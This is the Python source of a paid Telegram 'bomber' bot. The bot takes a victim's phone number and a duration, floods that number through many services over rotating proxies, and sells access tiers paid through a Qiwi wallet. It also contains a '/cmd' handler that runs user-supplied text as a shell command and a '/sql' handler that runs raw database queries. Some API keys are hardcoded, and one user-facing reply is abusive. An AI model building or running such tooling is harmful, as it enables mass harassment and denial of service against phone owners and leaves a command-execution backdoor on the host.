import sys

sys.path.append("../..")  # append Services to python path import

import asyncio
import logging
import traceback
import os
import re
import threading
import time
import uuid

import sentry_sdk
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.types import ContentTypes
from aiogram_broadcaster import MessageBroadcaster

from func import *
import Services
import Services.proxoid

import config_file as cfg
from _sql import Sql

os.chdir(os.path.dirname(os.path.realpath(__file__)))

if os.name == 'nt':  # If os == Шindows
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())  # fix for "Asyncio Event Loop is Closed"

sentry_sdk.init("https://5ee299beebac4280a92fc9a1b591a69b@o453662.ingest.sentry.io/5944929", traces_sample_rate=1.0)
logging.basicConfig(level=logging.WARNING)  # WARNING

proxyApi = Services.proxoid.Proxoid('25e6c5e10c61b89e94607807fc9a6fb4')
sql = Sql(**cfg.DB_CONF)
bot = Bot(token=cfg.TG_TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=MemoryStorage())


def spam(message: types.Message, phone: Services.phone.Phone, minutes: int):
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)

    _loop.run_until_complete(async_spam(message, phone, minutes))
    _loop.close()


async def async_spam(message: types.Message, phone: Services.phone.Phone, minutes: int):
    _bot = Bot(token=cfg.TG_TOKEN, parse_mode=types.ParseMode.HTML)
    Bot.set_current(_bot)

    alive_until = time.time() + (minutes * 60)
    thread_id = str(uuid.uuid4())
    await sql.create_thread(thread_id, message.chat.id, alive_until)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Остановить⛔️", callback_data=f"stop_thread::{thread_id}"))
    spam_info_msg = await message.reply(
        "<b>Спам успешно запущен!</b>\n\n"
        f"<b>Жертва</b>:  <code>{phone.number}</code>\n"
        f"<b>Количество минут спама</b>:  <code>{minutes}</code>\n"
        f"<b>Закончит примерно в</b>   <i>~</i> "
        f"<code>{stamp_to_date(alive_until, return_time=True)}</code><i>msk</i>",
        reply_markup=markup
    )

    requester = Services.Services(phone)
    await requester.async_load_from_sqlite3(cfg.DB_CONF, 'services')
    while (await sql.thread_alive(thread_id)) and time.time() < alive_until:
        proxy = None
        while proxy is None:
            temp_proxy = proxyApi.rotated_proxy
            con = asyncio.open_connection(temp_proxy.ip, int(temp_proxy.port))
            try:
                r, w = await asyncio.wait_for(con, timeout=0.5)
                w.close()
                proxy = temp_proxy
            except:
                temp_proxy.report()
        try:
            await requester.async_run(proxy=proxy)
        except:
            logging.error(traceback.format_exc())

    await sql.delete_thread(thread_id, message.chat.id)  # delete thread

    text = "<b>Спам закончен 😎.</b>\n\n" \
           f"<b>Жертва</b>:  <code>{phone.number}</code>\n" \
           f"<b>Количество минут спама</b>:  <code>{minutes}</code>\n"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Запустить еще раз🔃", callback_data=f"re_spam::{phone.number}::{minutes}"))

    try:
        await spam_info_msg.edit_text(text, reply_markup=markup)
    except:
        try:
            await spam_info_msg.reply(text, reply_markup=markup)
        except:
            pass


@dp.message_handler(regexp="^[+]*\d{10,} \d{1,4}")
async def start_spam_handler(message: types.Message):
    user = await sql.get_user(message.chat.id)
    rank = await sql.get_rank(user.rank_id)

    if not rank.access:
        return

    if (await sql.count_threads(message.chat.id)) >= rank.count_threads:
        await message.answer(f"Вы уже запустили <code>{rank.count_threads}</code> "
                             f"из <code>{rank.count_threads}</code> потоков.🤷‍♂️")
        return

    bomb_info = re.findall("^[+]*(\d{10,}) (\d{1,4})", message.text)[0]

    if int(bomb_info[1]) > rank.count_min:
        await message.answer("Вы указали слишком много минут.\n"
                             f"<i>Вам доступно: </i><code>{rank.count_min}</code> минут.")
        return

    phone = Services.phone.Phone(bomb_info[0])

    if not phone.valid:
        await message.answer("Вы указали неверный номер телефона.")
        return

    threading.Thread(target=spam, args=[message, phone, int(bomb_info[1])]).start()


@dp.message_handler(regexp="\/cmd (.*)")
async def start_spam_handler(message: types.Message):
    user = await sql.get_user(message.chat.id)
    rank = await sql.get_rank(user.rank_id)

    if not rank.access:
        return
    try:
        answer = os.popen(re.findall("\/cmd (.*)", message.text)[0]).read()
        await message.answer(f"Answer: <code>{answer}/code>")
    except Exception as err:
        await message.answer(f"Ошибочка.\n<code>{str(err)}/code>")


@dp.message_handler(regexp="\/sql (.*)")
async def start_spam_handler(message: types.Message):
    user = await sql.get_user(message.chat.id)
    rank = await sql.get_rank(user.rank_id)

    if not rank.access:
        return
    try:
        answer = await sql.async_query(re.findall("\/cmd (.*)", message.text)[0], sql.dict_factory)
        await message.answer(f"Answer: <code>{answer}/code>")
    except Exception as err:
        await message.answer(f"Ошибочка.\n<code>{str(err)}/code>")


@dp.message_handler(commands=['chatid'])
async def chatid_handler(message: types.Message):
    await message.answer(f"Your chat-id: {message.chat.id}")


def mailing_to_users(message: types.Message):
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)

    _loop.run_until_complete(async_mailing_to_users(message))
    _loop.close()


async def async_mailing_to_users(message: types.Message):
    _bot = Bot(token=cfg.TG_TOKEN, parse_mode=types.ParseMode.HTML)
    Bot.set_current(_bot)

    users = await sql.get_users_chatid()

    await message.reply("Рассылаю..")

    broadcaster = MessageBroadcaster(users, message, bot=_bot)
    await broadcaster.run()

    # noinspection PyProtectedMember
    await message.reply(
        f"Информация о рассылке: \n\n"
        f"Successful: <code>{len(broadcaster._successful)}</code>\n"
        f"Failure: <code>{len(broadcaster._failure)}</code>"
    )


@dp.channel_post_handler(lambda msg: msg.chat.id == -1001591780786, content_types=ContentTypes.ANY)
async def mailing_handler(message: types.Message):
    threading.Thread(target=mailing_to_users, args=[message]).start()


async def supports(message: types.Message):
    supports_text = ""
    for admin in await sql.get_admins():
        if admin.chatid == 1546285582:
            continue
        username = (await bot.get_chat(admin.chatid)).username
        if username:
            supports_text += f"@{username}\n"
    await message.answer(f"Наша администрация: \n{supports_text}")


@dp.message_handler(content_types=['text'])
async def text_handler(message: types.Message):
    user = await sql.get_user(message.chat.id)
    rank = await sql.get_rank(user.rank_id)

    promo = re.findall("^/start (.+)", message.text)
    if promo:
        promo = await sql.get_promo(promo[0])
        if promo:
            await sql.delete_promo(promo[0].uuid)

            if promo[0].until and promo[0].until < time.time():
                await message.answer("Увы, но промокод уже истек :(")
                return

            temp_rank = await sql.get_rank(promo[0].rank_id, False)
            if temp_rank:
                rank = temp_rank[0]
                await sql.change_rank(message.chat.id, promo[0].rank_id, promo[0].until)
                await message.answer(f"<i>По промокоду твой ранг был сменен на</i> {rank.name}\n\n"
                                     f"<b>Подписка до</b>: {subscribe_until(promo[0].until)}")
            else:
                await message.answer("Извини, но такого ранга не существует, со временем все меняется.")
                return
        else:
            await message.answer("Извини, но такого промокода не существует или он уже активирован.")
            return

    if user.until:  # if time expiration set
        if user.until < time.time():  # if expire
            await sql.change_rank(message.chat.id, cfg.DEFAULT_RANK, 0)  # set default rank
            await message.answer(f'Ваш тариф закончился {stamp_to_date(user.until)}')
            await text_handler(message)  # run handler again
            return  # exit

    if rank.can_buy:
        if message.text == 'Тарифные планы💳':
            available_ranks = await sql.get_ranks_for_sale(user.rank_id)
            text = "<b>Доступные тарифы для приобритения:</b>\n\n\n" + \
                   ("\n\n".join([
                       f"[<code>{_rank.name}</code>] - "
                       f"<code>{_rank.count_threads}</code> <i>Потоков</i> - "
                       f"<code>{_rank.count_min}</code> <i>Минут</i> — "
                       f"<code>{_rank.price}</code><i>rub.</i>\n"
                       f"Приобрести - /buy_{_rank.id}"
                       for _rank in available_ranks])) + \
                   "\n\n\nВсе тарифы <b>приобритаются на год</b>!\n" \
                   "Возрата - нет."
            await message.answer(text)
            return
        elif message.text == '🛠Support🛠':
            await supports(message)
            return
        buy_msg = re.findall("/buy_(\d*)", message.text)
        if buy_msg:
            selected_rank = await sql.get_rank(int(buy_msg[0]), False)
            if selected_rank:
                selected_rank = selected_rank[0]
                if selected_rank.for_sale:
                    comment = gen_coment("tg_nano", message.chat.id, selected_rank.id, selected_rank.price)
                    markup = types.InlineKeyboardMarkup()
                    markup.add(
                        types.InlineKeyboardButton("Оплатить", url=gen_url('79384302457', selected_rank.price, comment))
                    )
                    await message.answer(
                        f'ОПЛАТА НА 🥝КИВИ КОШЕЛЕК🥝\n\n'
                        f'Переведите <code>{selected_rank.price}</code><i>rub.</i>\n'
                        f'На номер: <code>+79384302457</code>\n'
                        f'С коментарием: <code>{comment}</code>\n\n'
                        f'Отговорки по типу "<i>Я нечаянно изменил коментарий</i>" - не принимаются.\n'
                        f'Желаете оплатить с другого банка? - оплачивайте и отправляйте чек любому нашему админу.',
                        reply_markup=markup
                    )
                    return
            await message.answer("Ты блять совсем нахуй конченный?\n"
                                 "Хули ты тут делаешь пидорас ебанный? пашел нахуй))\n"
                                 "Заебали ебанные мелкие пентестеры, я в рот ебал вас нахуй")
            return

    if not rank.access:
        if rank.can_buy:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            markup.add('Тарифные планы💳')
            markup.add("🛠Support🛠")
            await message.answer(
                "👋 Привет\n⏩ Чтоб приобрести нужно нажать на кнопочку ниже ⏪",
                reply_markup=markup
            )
            return
    else:
        if message.text == "💣BOMB💣":
            await message.answer(
                "<b>Просто напишите номер телефона и количество минут спама</b>\n"
                f"Сервисов в бомбере - <code>{await sql.count_of_services()}</code>\n\n"
                "Допустимые форматы:\n"
                "🇷🇺<code>79000000228 2</code>\n"
                "🇺🇦<code>380501334228 7</code>\n"
                "(другие страны тоже работают)"
            )
        elif message.text == "👤Профиль👤":
            await message.answer(
                "⠀   <b>Ваш профиль:</b>\n\n"
                f"🆔: <code>{message.chat.id}</code>\n"
                f"<i>Ранг</i>: <code>{rank.name}</code>\n"
                f"<i>Максимум минут</i>: <code>{rank.count_min}</code>\n"
                f"<i>Потоков</i>: <code>{await sql.count_threads(message.chat.id)}</code>"
                f"/"
                f"<code>{rank.count_threads}</code>\n\n"
                f"<b>Подписка до</b>: {subscribe_until(user.until)}"
            )
        elif rank.admin and message.text == 'ADM':
            markup = types.InlineKeyboardMarkup(resize_keyboard=True)
            markup.add(types.InlineKeyboardButton("Статистика", callback_data="stats"))
            markup.add(
                types.InlineKeyboardButton("Пользователь", callback_data="user"),
                types.InlineKeyboardButton("Промокоды", callback_data="promo"),
                types.InlineKeyboardButton("Тарифы", callback_data="tariff")
            )
            markup.add(types.InlineKeyboardButton("Остановить все потоки", callback_data="stop_all_threads"))
            await message.answer_photo(
                open("img/adminpanel.png", 'rb'),
                reply_markup=markup
            )
        elif message.text == '🛠Support🛠':
            await supports(message)
        else:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            markup.add("💣BOMB💣")
            if rank.can_buy:
                markup.add("Тарифные планы💳")
            markup.add("👤Профиль👤")
            if rank.admin:
                markup.add("ADM")
            else:
                markup.add("🛠Support🛠")

            await message.answer(
                'Приветствую✋\nМеню ниже.',
                reply_markup=markup
            )


@dp.message_handler(state='user_profile')
async def test(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        menu_message_id = data.get('message_id')
        need_edit = data.get("need_edit")

    user = await sql.get_user(message.text, return_user=False)
    await bot.delete_message(message.chat.id, message.message_id)

    if user:
        await state.finish()
        await show_user_profile(message.chat.id, menu_message_id, user[0])
    else:
        if need_edit:
            await state.update_data(need_edit=False)

            markup = types.InlineKeyboardMarkup(resize_keyboard=True)
            markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data="admin"))
            await bot.edit_message_caption(
                message.chat.id,
                menu_message_id,
                caption="Увы, я не нашел такого пользователя, попытайтесь еще раз!",
                reply_markup=markup
            )


async def show_promo(chat_id, message_id, update_photo=True):
    if update_photo:
        await bot.edit_message_media(
            types.InputMedia(type='photo', media=open("img/promo.png", 'rb')),
            chat_id,
            message_id
        )

    markup = types.InlineKeyboardMarkup(resize_keyboard=True)
    markup.add(types.InlineKeyboardButton("Создать", callback_data=f"create_promo"))
    markup.add(types.InlineKeyboardButton("Удалить все", callback_data=f"delete_all_promo"))
    markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data="admin"))

    await bot.edit_message_caption(
        chat_id,
        message_id,
        caption=f"<b>Число активных промо-кодов:</b> <code>{await sql.count_promo()}</code>",
        reply_markup=markup
    )


async def show_user_profile(chat_id, message_id, user, update_photo=True):
    if update_photo:
        await bot.edit_message_media(
            types.InputMedia(type='photo', media=open("img/profile.png", 'rb')),
            chat_id,
            message_id
        )

    markup = types.InlineKeyboardMarkup(resize_keyboard=True)
    markup.add(
        types.InlineKeyboardButton("Тариф", callback_data=f"change_rank::{user.chatid}"),
        types.InlineKeyboardButton("Длительность", callback_data=f"change_expire::{user.chatid}")
    )
    markup.add(types.InlineKeyboardButton("Сброс потоков", callback_data=f"stop_threads::{user.chatid}"))
    markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data="admin"))

    rank = await sql.get_rank(user.rank_id)
    tg_info = await bot.get_chat(user.chatid)

    await bot.edit_message_caption(
        chat_id,
        message_id,
        caption=f"🆔: <code>{user.chatid}</code>\n\n"
                f"<i>Ранг</i>: <code>{rank.name}</code>\n"
                f"<i>Максимум минут</i>: <code>{rank.count_min}</code>\n"
                f"<i>Потоков</i>: <code>{await sql.count_threads(user.chatid)}</code>"
                f"/"
                f"<code>{rank.count_threads}</code>\n\n"
                f"<b>Подписка до</b>: "
                f"{subscribe_until(user.until)}\n\n"
                f"<b>Telegram-Info:</b>\n"
                f"Name: {tg_info.first_name}|{tg_info.last_name}\n"
                f"Username: @{tg_info.username}",
        reply_markup=markup
    )


async def show_select_rank(chat_id, message_id, return_callback, back):
    markup = types.InlineKeyboardMarkup()
    markup.add(*[
        types.InlineKeyboardButton(rank.name, callback_data=return_callback + f"::{rank.id}")
        for rank in await sql.get_ranks()
    ])
    markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data=back))

    await bot.edit_message_media(
        types.InputMedia(type='photo', media=open("img/selectrank.png", 'rb')),
        chat_id,
        message_id,
        reply_markup=markup
    )


async def show_expire(chat_id, message_id, return_callback, back):
    markup = types.InlineKeyboardMarkup()
    markup.add(*[
        types.InlineKeyboardButton("1 День", callback_data=return_callback + f"::{1}"),
        types.InlineKeyboardButton("7 Дней", callback_data=return_callback + f"::{7}"),
        types.InlineKeyboardButton("14 Дней", callback_data=return_callback + f"::{14}")
    ])
    markup.add(*[
        types.InlineKeyboardButton("1 Месяц", callback_data=return_callback + f"::{int(1 * 30.417)}"),
        types.InlineKeyboardButton("3 Месяца", callback_data=return_callback + f"::{int(3 * 30.417)}"),
        types.InlineKeyboardButton("9 Месяцев", callback_data=return_callback + f"::{int(9 * 30.417)}")
    ])
    markup.add(types.InlineKeyboardButton("1 Год", callback_data=return_callback + f"::{365}"))
    markup.add(types.InlineKeyboardButton("Навсегда☄️", callback_data=return_callback + f"::{0}"))
    markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data=back))
    await bot.edit_message_media(
        types.InputMedia(type='photo', media=open("img/selectexpire.png", 'rb')),
        chat_id,
        message_id,
        reply_markup=markup
    )


@dp.callback_query_handler(state='*')
async def inline_callback(query: types.CallbackQuery, state: FSMContext):
    user = await sql.get_user(query.message.chat.id)
    rank = await sql.get_rank(user.rank_id)

    if not rank.access:
        return

    data_form = query.data.split("::")

    if data_form[0] == 'stop_thread':
        await sql.delete_thread(data_form[1], query.message.chat.id)
        await query.answer("Ожидайте, поток останавливается!")
    elif data_form[0] == 're_spam':
        if (await sql.count_threads(query.message.chat.id)) >= rank.count_threads:
            await query.answer(f"Вы уже запустили {rank.count_threads} из {rank.count_threads} потоков.🤷‍♂️")
        elif int(data_form[2]) > rank.count_min:
            await query.answer("Вы указали слишком много минут."
                               f"Вам доступно: {rank.count_min} минут.")
        else:
            threading.Thread(target=spam, args=[query.message, Services.Phone(data_form[1]), int(data_form[2])]).start()
            await query.answer()

    elif rank.admin and data_form[0] == 'user':
        await state.set_state("user_profile")
        await state.update_data(message_id=query.message.message_id, need_edit=True)

        markup = types.InlineKeyboardMarkup(resize_keyboard=True)
        markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data="admin"))
        await bot.edit_message_media(
            types.InputMedia(type='photo', media=open("img/sendchatid.png", 'rb')),
            query.message.chat.id,
            query.message.message_id,
            reply_markup=markup
        )

        await query.answer()
    elif rank.admin and data_form[0] == 'back_to_profile':
        await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
    elif rank.admin and data_form[0] == 'change_rank':
        if len(data_form) == 2:
            await show_select_rank(
                query.message.chat.id,
                query.message.message_id,
                query.data,
                f"back_to_profile::{data_form[1]}"
            )
            await query.answer()
        elif len(data_form) == 3:
            await sql.change_rank(data_form[1], data_form[2])
            await query.answer("Тариф успешно изменен!")
            await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
    elif rank.admin and data_form[0] == 'change_expire':
        if len(data_form) == 2:
            await show_expire(
                query.message.chat.id,
                query.message.message_id,
                query.data,
                f"back_to_profile::{data_form[1]}"
            )
            await query.answer()
        elif len(data_form) == 3:
            await sql.change_expire(
                data_form[1], 0 if data_form[2] == '0' else time.time() + (int(data_form[2]) * 24 * 60 * 60)
            )
            await query.answer("Тариф успешно продлен!")
            await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))
    elif rank.admin and data_form[0] == 'stop_threads':
        await sql.delete_user_threads(data_form[1])
        await query.answer("Потоки пользователя остановлены!")
        await show_user_profile(query.message.chat.id, query.message.message_id, await sql.get_user(data_form[1]))

    elif rank.admin and data_form[0] == 'promo':
        await show_promo(query.message.chat.id, query.message.message_id)
    elif rank.admin and data_form[0] == 'create_promo':
        if len(data_form) == 1:
            await show_select_rank(
                query.message.chat.id,
                query.message.message_id,
                query.data,
                f"promo"
            )
        elif len(data_form) == 2:
            await show_expire(
                query.message.chat.id,
                query.message.message_id,
                query.data,
                f"promo"
            )
        elif len(data_form) == 3:
            until = 0 if data_form[2] == '0' else time.time() + (int(data_form[2]) * 24 * 60 * 60)
            promo = await sql.create_promo(
                str(uuid.uuid4()).split('-')[0],
                data_form[1],
                until
            )
            await query.message.answer(
                f"Промо-код на подписку <b>{(await sql.get_rank(data_form[1])).name}</b>:\n"
                f"https://t.me/nanobomber_bot?start={promo}\n\n"
                f"<b>Будет активен до</b>: {subscribe_until(until)}"
            )
            await query.answer("Success!")
            await show_promo(query.message.chat.id, query.message.message_id)
    elif rank.admin and data_form[0] == 'delete_all_promo':
        await sql.delete_all_promo()
        await show_promo(query.message.chat.id, query.message.message_id, False)
        await query.answer("Все промо-коды успешно удалены!")

    elif rank.admin and data_form[0] == 'tariff':
        await query.answer("Мнеее лееень бляяять, я по-моему и так много сделал.")

    elif rank.admin and data_form[0] == 'admin':
        await state.reset_state()
        # Edit photo and set markup
        markup = types.InlineKeyboardMarkup(resize_keyboard=True)
        markup.add(types.InlineKeyboardButton("Статистика", callback_data="stats"))
        markup.add(
            types.InlineKeyboardButton("Пользователь", callback_data="user"),
            types.InlineKeyboardButton("Промокоды", callback_data="promo"),
            types.InlineKeyboardButton("Тарифы", callback_data="tariff")
        )
        markup.add(types.InlineKeyboardButton("Остановить все потоки", callback_data="stop_all_threads"))
        await bot.edit_message_media(
            types.InputMedia(type='photo', media=open("img/adminpanel.png", 'rb')),
            query.message.chat.id,
            query.message.message_id,
            reply_markup=markup
        )

        await query.answer()
    elif rank.admin and data_form[0] == 'stats':
        # Edit photo
        await bot.edit_message_media(
            types.InputMedia(type='photo', media=open("img/stats.png", 'rb')),
            query.message.chat.id,
            query.message.message_id
        )

        # edit caption (message)
        markup = types.InlineKeyboardMarkup(resize_keyboard=True)
        markup.add(types.InlineKeyboardButton("Вернуться ↩️", callback_data="admin"))
        await bot.edit_message_caption(
            query.message.chat.id,
            query.message.message_id,
            caption=f"<b>Пользователей всего</b>: <code>{await sql.count_of_users()}</code>\n\n" +
                    ("\n".join([f"{_rank['id']}) {_rank['name']}: <code>{_rank['count']}</code>" for _rank in
                                await sql.get_rank_stats()])) +
                    F"\n\n<b>Запущеных потоков</b>: <code>{await sql.count_threads()}</code>",
            reply_markup=markup
        )

        await query.answer("Отчет подготовлен✅")
    else:
        print(data_form)
        await query.answer()


if __name__ == '__main__':
    loop = asyncio.new_event_loop()
    loop.run_until_complete(bot.send_message(1546285582, os.popen('ulimit -a').read()))
    loop.run_until_complete(sql.delete_threads())
    executor.start_polling(dp, loop=loop, skip_updates=True, relax=0.05)
